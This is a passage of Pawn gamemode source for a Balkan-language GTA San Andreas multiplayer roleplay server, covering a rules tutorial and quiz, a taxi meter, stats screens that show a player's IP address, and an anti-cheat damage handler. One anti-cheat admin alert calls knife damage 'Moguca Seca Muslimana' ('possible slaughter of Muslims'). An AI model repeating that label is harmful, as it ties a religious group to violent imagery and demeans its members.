			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Deathmatch [DM] ~");
	   		SCM( playerid, BELA, " ");
	   		SCM( playerid, BELA, "Ubijanje ljudi bez ikakvog IC i RP razloga. ");
			SCM( playerid, BELA, "Ima dosta primjera za ovo Pravilo, navest cu vam par koji se vrlo cesto krse i na koje bi trebali pripaziti. ");
			SCM( playerid, BELA, "Prvi primjer je pucanje na javnim mjestima, pod javna mjesta spadaju Burger Shot, Pizza Stack, Banka, Vijecnica, Casino i slicno. ");
			SCM( playerid, BELA, "Znaci kod svih tih mjesta postoje ili nekakvi strazari, kamere ili nesto sto bi vas dovesti u opasnost i gdje bi vas mogli prijaviti ");
			SCM( playerid, BELA, "ili uhvatiti. Drugi primjer je kada pucate po svemu sto god vidite bez ikakvog razloga i strogo ce se kaznjavat ovo krsenje Pravila. ");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 30000, 0, "ii", playerid, 5);
		}
		else if(learnid == 5)
		{
		    SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Roleplay 2 Win [RP2WIN] ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Ovo pravilo znaci RPanje nekakve situacije u svoju korist bez pruzanja prilike drugim igracima da se pokusaju izvuci iz te situacije.");
			SCM( playerid, BELA, "Dobar primjer je ukoliko vas PD/FBI uhvati i pretrese Vas i pronadju 2 grama kokain i Vi napisete da se to nenalazi kod Vas vec ste to");
			SCM( playerid, BELA, "ostavili u kuci je cist primjer RP 2 Win-a. Sve sto se skriptom nalazi kod Vas onda je kod Vas i IC.");
			SCM( playerid, BELA, "Zabranjena je zloupotreba ovog Pravila i strogo ce se kaznjavat krsenje ovog Pravila.");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 30000, 0, "ii", playerid, 6);
		}
		else if(learnid == 6)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Drive By [DB] ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Pucanje iz vozila(Automobil,motor,zrakoplov,plovilo) sa mjesta vozaca na pjesake, motoriste i bicikliste. ");
			SCM( playerid, BELA, "Takodjer u ovo Pravilo i spada ubijanje ljudi sa elisom od helikoptera, te se odnosi na vozace uglavnom. ");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 15000, 0, "ii", playerid, 7);
		}
		else if(learnid == 7)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Bunny Hopp [BH] ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Skakanje jednom, dva puta ili vise puta prilikom trcanja sa ciljem brzeg trcanja ili izbjegavanja nekakvih situacija. ");
			SCM( playerid, BELA, "Bunny Hopping je strogo zabranjen i bilo bi prikladno da hodat/trcite kao i u pravome zivotu, to jest hodati drzeci ");
			SCM( playerid, BELA, "tipku ALT ili upisivanjem neke od komandi za hodanje(/gwalk, /walk). ");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 15000, 0, "ii", playerid, 8);
		}
		else if(learnid == 8)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Revenge Kill [RK] ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Kao sto i samo ime pojma govori, ovo Pravilo je ubojstvo iz osvete. ");
			SCM( playerid, BELA, "Ubijanje iz osvete je strogo zabranjeno iz razloga sto ukoliko netko ubije vas vi ne znate nista o toj osobi kada se ponovno respawnate i ");
			SCM( playerid, BELA, "nemate se pravo pribliziti njemu ili tom naselju ukoliko se on nalazi u nekakvoj bandi kada je on tamo. ");
			SCM( playerid, BELA, "Ukoliko se ponovno preko IC i RP nacina upoznate, tj. preko drugih ljudi koji su vas povezali onda ponovno saznajte informacije o njemu. ");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 20000, 0, "ii", playerid, 9);
		}
		else if(learnid == 9)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Non-Roleplay [NonRP] ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Ometanje RP radnji koje izvrsavaju drugi igraci smatra se krsenjem ovog pravila, primjeri ovog pravila su naprimjer ukoliko igrac");
			SCM( playerid, BELA, "nesto Roleplaya i vi dodjete do njega i pisete mu u OOC chat i ometate njegov Roleplay, takodjer u ovo Pravilo spada i parkiranje vozila ");
			SCM( playerid, BELA, "na sred ceste, zabijanje u svaku drugu banderu, voznja u ostecenom i skrsenom vozilu i ostalo krsenje pravila primjera PGa, DMa ili RKa. ");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 20000, 0, "ii", playerid, 10);
		}
		else if(learnid == 10)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Spamming [SPAM] ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Pisanje iste rijeci ili recenice dva ili vise puta za redom. ");
			SCM( playerid, BELA, "Znaci ukoliko ponovite isti tekst 2 ili vise puta smatrat ce se spamanjem. ");
			SCM( playerid, BELA, "Jedino opravdanje vaseg spamanja moze biti lagg ili nesto slicno. ");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 15000, 0, "ii", playerid, 11);
		}
		else if(learnid == 11)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Hacking & Exploiting [Hack & Abuse] ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Zabranjeno je koristenje bilo kakvih programa kojim se dobiva odredjena prednost u igri, u to takodjer spadaju sve vrste cheatova.");
			SCM( playerid, BELA, "Jedini dopusteni programi su: programi za pricanje s ostalim igracima ili video/glasovni poziv( Ventrilo, xFire, MSN, TeamSpeak, Skype).");
			SCM( playerid, BELA, "Takodjer su dozvoljeni modovi koji ne mijenjaju fizicku osnovu igre i Keybindsi.");
			SCM( playerid, BELA, "Zabranjuje se koristenje bilo kakvih poznatih/nepoznatih bugova/propusta u igri ili skripti koje ce vam donjeti prednost nad ostalim igracima.");
			SCM( playerid, BELA, "U to se ubraja i spawnanje novca, iskoristavanje bugova ili uzimanje CJ skina da biste brze trcali i ostale stvari.");
			SCM( playerid, BELA, "Kazne za krsenje ovih Server Pravila bit ce dozivotni ban bez prava na unban svima koji su pokusali na bilo koji nacin hackati ili abuseati.");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 40000, 0, "ii", playerid, 12);
		}
		else if(learnid == 12)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Iskoristavanje Admin & Supporter pozicije [Admin/Helper Abuse] ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Koristenje Admin/Helper pozicije za prijetnje ili za korist sebi, a na stetu drugima igracima je strogo zabranjeno i nece se tolerisati.");
			SCM( playerid, BELA, "Admin i Helperi su dobro upoznati sa ovim pravilom i znaju sve posljedice koje se ticu ovog Pravila.");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 20000, 0, "ii", playerid, 13);
		}
		else if(learnid == 13)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Terrorist RP [Terror RP] ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Zabranjeno je RPati terorista, jer sa time samo poticete Deathmatching i bez razloga ubijate ljude na serveru.");
			SCM( playerid, BELA, "Za to postoje drugi Deathmatching serveri pa se tamo odite ubijat sve sto se krece i pucat po svemu.");
			SCM( playerid, BELA, "Kazna za krsenje ovog Server Pravila bit ce dozivotni ban bez prava na unban.");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 20000, 0, "ii", playerid, 14);
		}
		else if(learnid == 14)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Ingame pljacke i prijevare ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Maksimalne dozvoljene pljacke nad drugim igracima su do 20.000$, ne vise od toga i naravno to sve mora biti lijepo IC");
			SCM( playerid, BELA, "i Roleplay opljackano, a ukoliko se tu radi o Roleplay prijevari maksimalno dozvoljena kradja je 50.000$.");
			SCM( playerid, BELA, "Strogo je zabranjeno je pljackanje i varanje igraca koji su 1, 2 ili 3 level, sve ostale levele iznad je dozvoljeno");
			SCM( playerid, BELA, "pljackati i varati do gore napisanih cifri.");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 20000, 0, "ii", playerid, 15);
		}
		else if(learnid == 15)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Komande /me, /do ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Komanda /me sluzi kako bismo iskazali neku vlastitu radnju koju ne mozemo pokazati likom jer nemamo posebnu animaciju za to ili tipku kojom ");
			SCM( playerid, BELA, "bi se posluzili. Nije potrebno koristiti /me komandu ukoliko imate odredjene animacije(/animacije) sa kojima bi mogli opisati neku situaciju.");
		 	SCM( playerid, BELA, "Takodjer pazite da neradite Powergaming sa ovom komandom tako  da morate pruziti i drugima sansu na Roleplay,");
		 	SCM( playerid, BELA, "a ne misliti samo na sebe i gledati kako cete izaci kao pobjednik.");
		 	SCM( playerid, BELA, "Komanda /do sluzi za opis nekakve situacije koju ne mozemo znati.");
		 	SCM( playerid, BELA, "Pomocu /do komande opisujemo situacije koje se ticu opisa charactera, situacije topa njuha i slicnih stvari koje spadaju u /do chat.");
		 	SCM( playerid, BELA, "Sluzi iskljucivo za opis necega sto ne mozemo predociti bez dodatnog opisa.");
		 	SCM( playerid, BELA, "Zabranjneno je pisanje onoga na primjer: /me udara Ime_Prezime u glavu.- /do Padas? i slicno, znaci takve situacije se nece tolerirati ");
		 	SCM( playerid, BELA, "i bit ce kaznjive po Pravilniku.");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 40000, 0, "ii", playerid, 16);
		}
		else if(learnid == 16)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Komande /ame, /attempt ~");
		 	SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Komanda /ame sluzi za opisivanje vlastitog lika(charactera) i to je tekst koji pise iznad vase glave.");
			SCM( playerid, BELA, "Preko ove komande mozete docarati opis i osobine svog lika kojeg RPate tako da napisete svoj izgled, visinu, dob, debljinu i slicne ");
			SCM( playerid, BELA, "stvari ali morate paziti da taj opis odgovara skinu kojeg nosite u igri. Ukoliko se koristite skin MODovima koristite /do komandu za bolji");
			SCM( playerid, BELA, "i detaljniji opis vaseg charactera.");
			SCM( playerid, BELA, " ");
			SCM( playerid, BELA, "Komanda /attempt sluzi kako bi pokusali iskazati neku radnju u kojoj imate 50 posto sanse da uspete i 50 posto sanse da ne uspete.");
			SCM( playerid, BELA, "Ova komanda se koristi kao pomoc /me i /do komandi i zabranjeno ju je koristiti nad ljudima i u nekakve Powergaming svrhe.");
			SCM( playerid, BELA, "Takodjer dozvoljeno je ovu komandu koristiti samo za svoje potrebe, u prijevodu smijete ju koristiti samo na sebi.");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 40000, 0, "ii", playerid, 17);
		}
		else if( learnid == 17 ) {
		    PitanjeBroj[ playerid ] = 1;
		    TacanOdgovor[ playerid ] = 0;
			SPD( playerid, dialog_RPTEST, DSL, "1. Sto je Metagaming [MG] ? ", "A) Koristenje OOC informacija u IC korist.\nB) Radnja koju je nemoguce izvesti u stvarnom zivotu u bilo kojem trenutku.\nC) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.\nD) Pisanje iste rijeci ili recenice dva ili vise puta za redom.", D_ODABERI, D_ODUSTANI );
            TimerPitanje[ playerid ] = SetTimerEx( "Pitanje", 120000, 0, "i", playerid);
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
public ClearKnock( playerid )
{
	TogglePlayerControllable( playerid, true );
	ClearAnimations( playerid );
 	KnockedDown[ playerid ] = false;
}
//------------------------------------------------------------------------------
public ClearPlayerRob( playerid )
{
 	IgracOpljackan[ playerid ] = false;
}
//------------------------------------------------------------------------------
public Taxitimer( playerid ) {
	new stringB[5],string[64];
	if( IsPlayerInAnyVehicle( playerid ) ) {
		if( VoziIgracaID[ playerid ] != INVALID_PLAYER_ID && GetPlayerVehicleID( playerid ) == GetPlayerVehicleID( VoziIgracaID[ playerid ] ) ) {
			if( GetSpeed( playerid ) > 5  ) {
				if( PlayerInfo[ VoziIgracaID[ playerid ] ][ xNovac ] >= CenaVoznje[ playerid ] ) {
				    CenaVoznje[ playerid ] += 10;
					format( string, sizeof( string ), "%s", GetPlayerLocation( VoziIgracaID[ playerid ] ) );
					PlayerTextDrawSetString( playerid, TaxistaTD[ playerid ][ 7 ], string );
					format( string, sizeof( string ), "%s", GetPlayerLocation( VoziIgracaID[ playerid ] ) );
					PlayerTextDrawSetString( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 7 ], string );

					format( stringB, sizeof( stringB ), "%d$", CenaVoznje[ playerid ] );
					PlayerTextDrawSetString( playerid, TaxistaTD[ playerid ][ 6 ], stringB);
					format( stringB, sizeof( stringB ), "%d$", CenaVoznje[ playerid ] );
					PlayerTextDrawSetString( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 6 ], stringB );
				}
				else {
				    TaximetarUkljucen[ playerid ] = false;

					PlayerTextDrawHide( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 0 ] );
					PlayerTextDrawHide( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 1 ] );
					PlayerTextDrawHide( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 2 ] );
					PlayerTextDrawHide( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 3 ] );
					PlayerTextDrawHide( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 4 ] );
					PlayerTextDrawHide( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 5 ] );
					PlayerTextDrawHide( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 6 ] );
					PlayerTextDrawHide( VoziIgracaID[ playerid ], TaxistaTD[ VoziIgracaID[ playerid ] ][ 7 ] );

					DajIgracuNovac( VoziIgracaID[ playerid ], -CenaVoznje[ playerid ] );
					DajIgracuNovac( playerid, CenaVoznje[ playerid ] );

					SendClientMessageEx( VoziIgracaID[ playerid ], ZUTA, "Zavrsili ste voznju jer nemate dovoljno novca. Naplaceno vam je %d.", CenaVoznje[ playerid ] );
					SendClientMessageEx( playerid, ZUTA, "Klijent nema dovoljno novca te je izasao i naplatili ste mu %d$ za voznju", CenaVoznje[ playerid ] );

					PlayerTextDrawSetString( playerid, TaxistaTD[ playerid ][ 6 ], "N/A" );
			        PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 6 ] );
					PlayerTextDrawSetString( playerid, TaxistaTD[ playerid ][ 7 ], "N/A" );
					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 7 ] );

					Novi_RemovePlayerFromVehicle( VoziIgracaID[ playerid ] );
					CenaVoznje[ playerid ] = 0;
					Novi_KillTimer( TaxiTimer[ playerid ] );
					offeredByCabbie[ VoziIgracaID[ playerid ] ] = INVALID_PLAYER_ID;
					VoziIgracaID[ playerid ] = INVALID_PLAYER_ID;
				}
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
public KSpam( playerid )
{
	if(GetPVarInt( playerid, "Kladjenje") == 1)
	{
		SetPVarInt( playerid, "Kladjenje", 0);
	}
	return 1;
}
// IsMeleeWeapon(weaponid)
// {
// 	switch(weaponid)
// 	{
// 		case 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15: return true;
// 	}
// 	return false;
// }
//------------------------------------------------------------------------------
stock ShowStats( playerid, targetid )
{
    if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) )
	{
		new pol[ 7 ];
		if( PlayerInfo[ playerid ][ xPol ] == 1 ) pol = "musko";
		else if( PlayerInfo[ playerid ][ xPol ] == 2 ) pol = "zensko";

		new nxtlevel = PlayerInfo[ targetid ][ xLevel ]+1,
		    expamount = nxtlevel*levelexp,
		    warns = PlayerInfo[ targetid ][ xWarn ],
		    level = PlayerInfo[ targetid ][ xLevel ],
			exp = PlayerInfo[ targetid ][ xRespekt ];

        new playersip[ 128 ];
        GetPlayerIp(targetid, playersip, sizeof( playersip ) );

        new weapon[13],
            weapname[13][50],
			bullets[13];

		for( new slot = 0; slot < 13; slot++) {
        	GetPlayerWeaponData( targetid, slot, weapon[ slot ], bullets[ slot ] );

            GetWeaponName( weapon[ slot ], weapname[ slot ], 50 );
		}


		SendClientMessage(playerid, 0x5BD3FFAA,"_________________________________________________");
		format( globalstring, sizeof( globalstring ),"*** %s ***", ImeIgraca( targetid ) );
		SendClientMessage(playerid, SRVBOJA1,globalstring);
		format( globalstring, sizeof( globalstring ), "Pol [%s] | Level:[%d] | Sati Igranja:[%d]", pol, level, PlayerInfo[ targetid ][ xOnlineSati ] );
		SendClientMessage(playerid, 0xFFFFFFAA,globalstring);
		format( globalstring, sizeof( globalstring ), "Respekt:[%d/%d] | Novac: [%d$] | Banka: [%d$]", exp, expamount, PlayerInfo[ targetid ][ xNovac ], PlayerInfo[ targetid ][ xBRacun] );
		SendClientMessage(playerid, 0xFFFFFFAA,globalstring);
		format( globalstring, sizeof( globalstring ), "Upozorenja: [%d/5] | Posao: [%s] | Posao ugovor: [%d/3] | Job Skill: [%d/5]", warns, getJobName( PlayerInfo[ targetid ][ xPosao ] ), PlayerInfo[ targetid ][ xUgovor ], PlayerInfo[playerid][xJobSkill] );
		SendClientMessage(playerid, 0xFFFFFFAA,globalstring);
		format( globalstring, sizeof( globalstring ), "Godine: [%d] | Organizacija: [%s] | Rank: [%d]", PlayerInfo[ targetid ][ xGodine ], getOrgName( PlayerInfo[ targetid ][ xClan ] ), PlayerInfo[ targetid ][ xRank ] );
		SendClientMessage(playerid, 0xFFFFFFAA,globalstring);
		format( globalstring, sizeof( globalstring ), "Kljuc Imovine1 [%d] | Kljuc Imovine2 [%d] | Kljuc Imovine3 [%d]", PlayerInfo[ targetid ][ xProperty ][ 0 ], PlayerInfo[ targetid ][ xProperty ][ 1 ], PlayerInfo[ targetid ][ xProperty ][ 2 ] );
		SendClientMessage(playerid, 0xF0F0F0FF,globalstring);
		format( globalstring, sizeof( globalstring ), "Kljuc Firme [%d] | Kljuc Vozila1 [%d] | Kljuc Vozila2 [%d]", PlayerInfo[ targetid ][ xFirmaID ], PlayerInfo[ targetid ][ xVoziloID ][ 0 ], PlayerInfo[ targetid ][ xVoziloID ][ 1 ] );
		SendClientMessage(playerid, 0xF0F0F0FF,globalstring);
		format( globalstring, sizeof( globalstring ), "Kljuc Vozila3 [%d] | Kljuc Vozila4 [%d] | Garaza [%d]", PlayerInfo[ targetid ][ xVoziloID ][ 2 ], PlayerInfo[ targetid ][ xVoziloID ][ 3 ], PlayerInfo[ targetid ][ xGarageID ] );
        SendClientMessage(playerid, 0xF0F0F0FF,globalstring);
        format( globalstring, sizeof( globalstring ), "Aktivnost igraca u staff timu: %d minuta", PlayerInfo[ targetid ][ xStaffMin ] );
		SendClientMessage( playerid, 0xF0F0F0FF, globalstring );
		format( globalstring, sizeof( globalstring ), "Kljuc hotela: [%d] | IP Adresa: [%s]", PlayerInfo[ targetid ][ xHotelID ], playersip );
		SendClientMessage( playerid, 0xF0F0F0FF, globalstring );
		format( globalstring, sizeof( globalstring ), "%s[0] | %s[%d] | %s[%d] | %s[%d] | %s[%d] | %s[%d]", weapname[0], weapname[1], bullets[1], weapname[2], bullets[2], weapname[ 3 ], bullets[ 3 ], weapname[4], bullets[4], weapname[5], bullets[5] );
		SendClientMessage( playerid, 0xF0F0F0FF,  globalstring );
		format( globalstring, sizeof( globalstring ), "%s[%d] | %s[%d] | %s[%d] | %s[0] | %s[0] | %s[0]", weapname[6], bullets[6], weapname[7], bullets[7] ,weapname[8], bullets[8], weapname[9], weapname[10], weapname[11] );
		SendClientMessage( playerid, 0xF0F0F0FF,globalstring );
		SendClientMessage( playerid, 0x5BD3FFAA,"_________________________________________________");
	}
}
//------------------------------------------------------------------------------
ShowPDStats( playerid, targetid )
{
	if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) )
	{
	    new coordsstring[84];
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	    strcat( DialogStrgEx, "__________________________________________________________________\n");
		format( coordsstring, sizeof( coordsstring ),"*** %s ***\n", ImeIgraca( targetid ) );
		strcat( DialogStrgEx, coordsstring );
		format( coordsstring, sizeof( coordsstring ), "Dao ticketa: [%d] | Oduzeo novaca preko ticketa: [%d]\n", PlayerInfo[ targetid ][ xPDStatsTicket ], PlayerInfo[ targetid ][ xPDStatsTicketMoney ] );
        strcat( DialogStrgEx, coordsstring );
		format( coordsstring, sizeof( coordsstring ), "Oduzeo oruzja: [%d] |  Oduzeo droge: [%d]\n", PlayerInfo[ targetid ][ xTakenWeps ], PlayerInfo[ targetid ][ xTakenDrugs ] );
        strcat( DialogStrgEx, coordsstring );
        format( coordsstring, sizeof( coordsstring ), "Puta uhitio nekoga: [%d]\n", PlayerInfo[ targetid ][ xPDUhapsio ] );
        strcat( DialogStrgEx, coordsstring );
        strcat( DialogStrgEx, "__________________________________________________________________");
        ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	}
}
//------------------------------------------------------------------------------
ShowAdminStats( playerid, targetid ) {
	if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) ) {
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	    strcat( DialogStrgEx, "__________________________________________________________________\n");
		format( globalstring, sizeof( globalstring ),"*** %s ***\n", ImeIgraca( targetid ) );
		strcat( DialogStrgEx, globalstring );
		format( globalstring, sizeof( globalstring ), "Dao banova: [%d] | Dao warnova: [%d] | Kickovao puta: [%d]\n", AI[ targetid ][ aTBan ], AI[ targetid ][ aTWarn ], AI[ targetid ][ aTKick ] );
        strcat( DialogStrgEx, globalstring );
		format( globalstring, sizeof( globalstring ), "Oduzeo novca: [%d] | Odgovorenih PMova: [%d] |  Stavio u zatvor/areu: [%d]\n", AI[ targetid ][ aTCharge ], AI[ targetid ][ aTPM ], AI[ targetid ][ aTJail ] );
        strcat( DialogStrgEx, globalstring );
        format( globalstring, sizeof( globalstring ), "Unbanovao puta: [%d] |  Unwarnovao puta: [%d] |  Unjailovao puta: [%d]\n", AI[ targetid ][ aTUnban ] , AI[ targetid ][ aTUnwarn ] , AI[ targetid ][ aTUnjail ] );
        strcat( DialogStrgEx, globalstring );
        strcat( DialogStrgEx, "__________________________________________________________________");
        ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	}
}
//------------------------------------------------------------------------------
public BackupClear( playerid, calledbytimer ) {
	if( IsPlayerConnected( playerid ) ) {
		if( GetFactionType( playerid ) == ORG_TIP_PD  ) {
			if( GetPVarInt( playerid, "RequestingBackup" ) == 1 ) {
				foreach( Player, i) {
					if( IsPlayerConnected(i)) {
						if( OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_PD ) {
							Novi_DisablePlayerCheckpoint( i );
						}
					}
				}
				if( calledbytimer != 1 ) {
					SCM( playerid, 0x8D8DFF00, "Vase pojacanje je izbrisano." );
				}
				else {
					SCM( playerid, 0x8D8DFF00, "Vas zahtev za pojacanje je izbrisano automatksi." );
				}
				SetPVarInt( playerid, "RequestingBackup", 0 );
			}
			else
			{
				if(calledbytimer != 1 ) {
					SendErrorMessage( playerid, "Nemate aktivan zahtev za pojacanje!");
				}
			}
		}
	}
	return 1;
}

public OnPlayerDamage(&playerid, &Float:amount, &issuerid, &weapon, &bodypart) {

    if(IgracLeti{playerid}) return 0;
    if(KoristiKran[playerid]) return 0;
    if(WARPInfo[ playerid ][ warID ] != -1) return 1;
    if(NaDmEventu[playerid]) return 1;

    if(issuerid != INVALID_PLAYER_ID && isForbidenWeapon(weapon)) {

        format( globalstring, sizeof( globalstring ), "| V:AC | Koriscenje Zabranjenog Oruzija || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( issuerid ), issuerid );
        AdminPoruka( ANTICHEAT, globalstring );
        return 0;
    }

    if(issuerid != INVALID_PLAYER_ID && weapon == 4 || weapon == 42) {

        format( globalstring, sizeof( globalstring ), "| V:AC | Moguca Seca Muslimana || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( issuerid ), issuerid );
        AdminPoruka( ANTICHEAT, globalstring );
        return 0;
    }

